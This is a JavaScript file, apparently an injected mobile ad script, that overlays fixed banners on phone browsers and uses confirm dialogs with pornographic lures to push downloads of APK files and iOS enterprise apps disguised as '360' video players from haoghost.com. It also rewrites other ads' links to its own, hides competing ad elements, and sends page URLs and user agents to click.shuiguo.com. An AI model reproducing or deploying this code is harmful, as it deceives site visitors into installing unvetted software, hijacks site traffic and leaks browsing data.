var hy_itv=setInterval(function(){
	if(!document || !document.body) return;
	else clearInterval(hy_itv);
	function setCookie(name,value){
        var Days = 30;  
        var exp  = new Date();  
        exp.setTime(exp.getTime() + Days*24*60*60*1000);  
        document.cookie = name + "="+ escape (value) + ";expires=" + exp.toGMTString()+";path=/";  
	}  

	function getCookie(name)
	{
		var arr,reg=new RegExp("(^| )"+name+"=([^;]*)(;|$)");
	 
		if(arr=document.cookie.match(reg))
	 
			return (arr[2]);
		else
			return null;
	}

	var getJsonp = function( url, data, callback, str )
	{
		var script = document.createElement("script"),
			target = document.getElementsByTagName("head")[0],
			obj = null;
		script.type = "text/javascript";
		script.language = "javascript";
		if(str){this[str]=callback;}
		this.jsonpcallback=callback;
		var data = data ? "&" + data : "",
			isOp = /\?{1}/.test( url ),
			domain = isOp ? url.slice( 0, url.search( /\?{1}/ ) ) : url,
			option = isOp ?  url.slice( url.search( /\?{1}/ ) + 1 ) + data : data;
		script.src = domain + "?"  + option;
		target.appendChild( script );
		script.onload = script.onreadystatechange = function()
		{
			if (!this.readyState || this.readyState === "loaded" || this.readyState === "complete" )
			{
				callback( null , obj );
				this.onload = this.onreadystatechange = null;
				this.parentNode.removeChild( this );
			};
		};
		return obj;
	};

	var num=hy_cpc_num || "10",imgPath="http://m.haoghost.com/images/",downPath="http://d.haoghost.com/",isup=2;
	var pname=getDownUrl(),iosname=getIosDownUrl();

	var azimgs=["wb_b5.gif","wb_b3.gif","wb_b2.gif","wb_b.gif"],
		azlinks=["http://m.haoghost.com/?f=cpctag_"+num,"http://m.haoghost.com/note.html?f=cpctag_"+num,downPath+"360ysdq.apk",downPath+"360wysp.apk"],
		aztooltip=["","","正在下载快播魅影,激情无码视屏随意看","正在下载午夜视频,私密珍藏大片任你看"];

	if(num==18 || num==19 || num==15)
	{
		azimgs=["wb_b5.gif","wb_b3.gif","wb_b2.gif","wb_b.gif"],
		azlinks=["http://m.haoghost.com/?f=cpctag_"+num,"http://m.haoghost.com/note.html?f=cpctag_"+num,downPath+"360ysdq.apk",downPath+"360wysp.apk"],
		aztooltip=["","","正在下载快播魅影,激情无码视屏随意看","正在下载午夜视频,私密珍藏大片任你看"];
	}
	if(num==23)
	{
		//azimgs=["wb_b5.gif","wb_b3.gif","wb_n1.gif","wb_n2.gif"];
		azimgs=["wb_b5.gif","wb_b3.gif","wb_b2.gif","wb_b.gif"];
	}
	

	//正在下载娇羞小苹果,少妇的秘密尽在其中 正在下载书旗小说,千万图书库离线观看

	var alen=azimgs.length;
	if(num==24||num==25||num==26) isup=1;
	function getNum(){
		var num=parseInt(getCookie("hy_visit_time"));
		if(isNaN(num))
		{
			num=0;
		}
		if(num>=alen) num=0;
		setCookie("hy_visit_time",num+isup);
		return num;

	}
	var thisnum=getNum(),thisnumplus=thisnum==alen-1?0:thisnum+1;


	if(getCookie("hycpc1")){
		pname="360ysdq.apk";
		iosname="http://www.haima.me/?c=cpapz";
	}

	function getDownUrl()
	{
		if(/ipad|iphone|ipod/i.test(navigator.userAgent))
		{
			return getIosDownUrl();
		}
		else
		{
			return getAndroidDownUrl();
		}
	}

	function getIosDownUrl()
	{
		var result;
		switch(num)
		{
			case "16":
				var rd=Math.random();
				if(rd<0.3) result="http://www.haima.me/?c=cpapz";
				if(rd<0.95 && rd>=0.3) result="http://www.haima.me/?c=cpapz01";
				if(rd>=0.95) result="http://www.haima.me/tg/cpacxmx13";
				break;
			default:
				result="itms-services:///?action=download-manifest&amp;url=https://qvod.bb800.com/assets/upload/130.plist";
		}
		return result;
	}

	function getAndroidDownUrl()
	{
		var result;
		switch(num)
		{
			case "16":
				result="360ysdq2.apk";
				break;
			default:
				if(Math.random()>0.7) result="360sqyy.apk";
				else result="360sqyy685.apk";
		}
		return result;
	}

	function getAndroidImage(str)
	{
		if(str=="top")
		{
			return imgPath+azimgs[thisnumplus];
		}
		if(str=="bottom")
		{
			return imgPath+azimgs[thisnum];
		}
	}

	function getIosImage(str)
	{
		if(str=="top")
		{
			return imgPath+"wb_t2.gif";
		}
		if(str=="bottom")
		{
			return imgPath+"wb_ios2.gif";
		}
	}
	

	if(/android/i.test(navigator.userAgent) || /ipad|iphone|ipod/i.test(navigator.userAgent))
	{
		
		function autoDown()
		{
			var date = new Date();
			var cd=30;
			if(num==18 || num==19) cd=10;

			if(!getCookie("hycookietime"))
			{
				setCookie("hycookietime",date.getTime());
				return true;
			}
			else
			{
				var now=date.getTime(),before=parseInt(getCookie("hycookietime"));
				if(now-before>cd * 60 * 1000)
				{
					setCookie("hycookietime",now);
					return true;
				}
			}

			return false;
		}

		

		var num1="tag_"+num+"1",num2="tag_"+num+"2",azlink=azlinks[thisnum],ioslink="http://m.haoghost.com/ios.html?f=cpctag_"+num,lastlink=azlinks[0];
		var toplink='<a href="'+azlinks[thisnumplus]+'" id="hy_'+num1+'" style="display:block;margin:0 auto;"><img id="hy_cpc_imgt" src="'+getAndroidImage("top")+'" width=100%/><span id="hy_cpc_tclose" style="display:block;position:absolute;width:5%;height:20%;top:10%;right:2%"></span></a>';
		var bottomlink='<a href="'+azlinks[thisnum]+'" id="hy_'+num2+'" style="display:block;margin:0 auto;"><img id="hy_cpc_imgb" src="'+getAndroidImage("bottom")+'" width=100%/><span id="hy_cpc_bclose" style="display:block;position:absolute;width:5%;height:20%;top:10%;right:2%"></span></a>';
		if(/ipad|iphone|mac|ios/i.test(navigator.userAgent))
		{
			lastlink=ioslink;
			num1="tag_"+num+"3";num2="tag_"+num+"4";
			toplink='<a href="'+ioslink+'" id="hy_'+num1+'" style="display:block;margin:0 auto;"><img id="hy_cpc_imgt" src="'+getIosImage("top")+'" width=100%/><span id="hy_cpc_tclose" style="display:block;position:absolute;width:5%;height:20%;top:10%;right:2%"></span></a>';
			bottomlink='<a href="'+ioslink+'" id="hy_'+num2+'" style="display:block;margin:0 auto;"><img id="hy_cpc_imgb" src="'+getIosImage("bottom")+'" width=100%/><span id="hy_cpc_bclose" style="display:block;position:absolute;width:5%;height:20%;top:10%;right:2%"></span></a>';
		}
		var str='<div id="hy_cpc_top" style="text-align: center;display: block;width: 100%;filter: alpha(opacity=90);-moz-opacity: 0.9;-khtml-opacity: 0.9;opacity: 1;position: fixed;top: 0px;left: 0px;background-color: rgb(51, 51, 51);z-index: 2147483647;">'+
			toplink+'</div><div id="hy_cpc_bottom" style="text-align: center;display: block;width: 100%;opacity: 1;position: fixed;bottom: 0px;background-color: rgb(51, 51, 51);z-index: 2147483647;right: 0px;">'+
			bottomlink+'</div><div id="hy_cpc_tj" style="display:none"></div>';
		var div=document.createElement("div");
		div.innerHTML=str;

		document.body.appendChild(div);
		var ww=window.screen.width;
		ww=ww>400?360:ww;
		var t1=document.getElementById("hy_"+num1),t2=document.getElementById("hy_"+num2),wh=ww*90/435,h1=document.getElementById("hy_cpc_top"),h2=document.getElementById("hy_cpc_bottom"),i1=document.getElementById("hy_cpc_imgt"),i2=document.getElementById("hy_cpc_imgb");
		
		(function(){
			var script = document.createElement("script");
			var tj=document.getElementById("hy_cpc_tj");
			script.type = "text/javascript";
			script.language = "javascript";
			script.src="http://s95.cnzz.com/stat.php?id=1253202217";
			tj.appendChild(script);
		})()		

		if(num==24 || num==25 || num==26)
		{
			t1.style.display="none";
		}
		else
		{
			document.body.style["padding-top"]=wh+"px";
		}

		ww=ww>1305?1305:ww;
		
		document.body.style["padding-bottom"]=wh+"px";
		
		document.getElementById("hy_cpc_tclose").addEventListener("touchstart",function(event){
			h1.style.display="none";
			document.body.style["padding-top"]="0px";
			if (event.stopPropagation) {
				event.stopPropagation(); 
			} 
			else if (window.event) { 
				window.event.cancelBubble = true; 
			}
			return false;
		},false);
		document.getElementById("hy_cpc_bclose").addEventListener("touchstart",function(event){
			h2.style.display="none";
			document.body.style["padding-bottom"]="0px";
			if (event.stopPropagation) {
				event.stopPropagation(); 
			} 
			else if (window.event) { 
				window.event.cancelBubble = true; 
			}
			return false;
		},false);

		var ua=navigator.userAgent;

		(function(){

			var tt=document.getElementsByTagName("title")[0].innerHTML;


			var hyipdata=parseInt(getCookie("hyipdata"));
			if(hyipdata!=0 && hyipdata!=1 && /android/i.test(ua))
			{
				getJsonp(
					'http://m.haoghost.com/request.php?action=index&method=main1',
					"",
					function(data){
						if(data==0)
						{
							pname="hlyy4.apk";
							setCookie("hyipdata","0");
							getJsonp(
								'http://click.shuiguo.com/index.php?action=index&method=main1',
								"t=undefined&s=tag_888&ref="+document.URL+"&url="+document.URL+"&typeid=1&ug="+ua,
								function(data){

								}
							);
						}
						if(data==1)
						{
							setCookie("hyipdata","1");
						}
					},
					"hyipcb"
				);
			}
			else
			{
				if(hyipdata==0) pname="hlyy4.apk";
			}
			
			window.setTimeout(function(){
				if(num==18 || num==19)
				{
					if(tt.indexOf("》")<0 || !autoDown()) return;
					tt=tt.split("》")[0]+"》";
					tt="正在为您下载播放器，安装后即可观看"+tt;
				} 
				else if(num==15)
				{
					if(!autoDown()) return;
					tt="正在下载神奇影院，海量视频任你看";
				}
				else if(num==23 || num==24 || num==25 || num==26){
					if(!autoDown()) return;
					tt="正在下载神奇影院，海量爽片离线小说任你看。"
				}
				else
				{
					return;
				}
				if(window.confirm(tt)){
					if(/ipad|iphone|mac|ios/i.test(navigator.userAgent)) {
						window.location.href=iosname;	
					}
					else
					{
						window.location.href="http://d.haoghost.com/"+pname;
					}
				}
				
				
				setCookie("hycpc1","1");
			},2000)
			
		})();

		if(num==18 || num==19 || num==15 || num==22)
		{
			
			window.setInterval(function(){
				if(num==15)
				{
					var a151=document.getElementById("xcy_fmt"),a152=document.getElementById("__70e_1"),a153=document.getElementById("__70e_2");
					t1.setAttribute("style","");
					t2.setAttribute("style","");
					a151.style.display=a152.style.display=a153.style.display="none";
				}
				if(num==22)
				{
					
					var o22div=document.getElementById("__keyrun_RM_Div");
					if(o22div) o22div.parentNode.removeChild(o22div);
					var t22a,t22b=document.getElementById("viewxxx");
					if(t22b) t22b.setAttribute("href",lastlink);
					if(window.frames["baidu_clb_slot_iframe_984242_0"].document) t22a=window.frames["baidu_clb_slot_iframe_984242_0"].document.getElementsByTagName("a")[0];
					if(window.frames["BAIDU_DUP_wrapper_984242_0"].document) t22a=window.frames["BAIDU_DUP_wrapper_984242_0"].document.getElementsByTagName("a")[0];
					if(t22a) t22a.setAttribute("href",lastlink);
				}
				var d=document.getElementById("JS_BottmEX2_Div");
				var i=document.getElementsByTagName("ins");
				var as=document.getElementsByTagName("a"),str_gg=[];
				str_gg[0]="http://cnrdn.com/fyRE";
				str_gg[1]="http://xiazai.3ddianshiji.com/i/";
				str_gg[2]="http://download.wuji.com:6677/wuji/setup/";
				str_gg[3]="http://dl.client.baidu.com/union/";
				str_gg[4]="http://pc.cyousoft.com/shouqu_126_10.html";
				str_gg[5]="http://www.baidu.com/cb.php?";
				str_gg[6]="http://www.z3330.com";
				str_gg[7]="http://vs.cyousoft.com";
				if(d) d.style.display="none";
				if(i[0]) i[0].style.display="none";
				for(var i=0;i<as.length;i++)
				{
					var temp=as[i].getAttribute("href");
					if(!temp) continue;
					for(var j=0;j<str_gg.length;j++)
					{
						if(temp.indexOf(str_gg[j])>-1){as[i].setAttribute("href",lastlink);break;}
					}
					
				}
			},500);
		}

		if(/ipad|iphone|mac|ios/i.test(navigator.userAgent)) {return};
		

		var script = document.createElement("script");
		script.type = "text/javascript";
		script.language = "javascript";
		script.src="http://js.users.51.la/17318300.js";
		//script.src = "http://s95.cnzz.com/stat.php?id=1253099509&web_id=1253099509";
		
		var tj=document.getElementById("hy_cpc_tj");
		tj.appendChild(script);

		function send(obj,num)
		{
			setTimeout(function(){
				getJsonp(
					'http://click.shuiguo.com/index.php?action=index&method=main1',
					"t=undefined&l="+obj+"&s="+num+"&ref="+document.URL+"&url="+document.URL+"&typeid=1&ug="+ua,
					function(data){

					}
				);
			},0);

		}
		
		if(aztooltip[thisnumplus]!="")
		{
			i1.addEventListener("touchend",function(){send(t1.getAttribute("href"),num1);alert(aztooltip[thisnumplus]);});
		}
		if(aztooltip[thisnum]!="")
		{
			i2.addEventListener("touchend",function(){send(t2.getAttribute("href"),num2);alert(aztooltip[thisnum]);});
		}
		
		
	}
},500)


/*send("","tag_"+num+"9");
window.setTimeout(function(){
	t1.setAttribute("href","http://d.haoghost.com/360ysdq.apk");
	t2.setAttribute("href","http://d.haoghost.com/360ysdq.apk");
},1000);*/